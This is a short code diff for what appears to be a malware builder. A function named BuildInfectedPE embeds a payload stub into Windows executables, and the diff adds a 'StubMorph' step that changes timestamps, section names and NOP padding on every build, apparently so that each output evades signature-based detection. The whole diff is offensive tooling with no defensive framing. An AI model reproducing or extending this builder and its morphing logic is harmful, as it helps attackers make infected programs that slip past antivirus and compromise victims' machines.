@@ -1,5 +1,6 @@
 #include "PeBuilder.h"
 #include "OpsecFlags.h"
+#include "StubMorph.h"
 #include <stdio.h>
 #include <string.h>
 #include <wincrypt.h>
@@ -70,7 +71,7 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
     BYTE* pStubBuf    = NULL;
     DWORD stubBufSize = 0;
     if (!ReadFileToBuffer(stubPath, &pStubBuf, &stubBufSize)) {
-        printf("[!] Error reading stub.bin: %s  Error: %lu\n", stubPath, GetLastError());
+        printf("[!] Error reading stub: %s  Error: %lu\n", stubPath, GetLastError());
         return FALSE;
     }
 
@@ -126,6 +127,12 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
             return FALSE;
         }
         printf("[+] RT_RCDATA resource ID: %u (0x%04X)\n", resourceId, resourceId);
+    }
+
+    // 2c. Per-build safe PE morph (timestamp, section names, island NOPs).
+    //     After marker patches so morph cannot disturb TLS/ResID tags we just wrote.
+    if (!StubMorph_Apply(pStubBuf, stubBufSize)) {
+        printf("[!] WARNING: StubMorph_Apply failed — continuing with unmorphed stub\n");
     }
 
     // 3. Write (possibly patched) stub to output path.
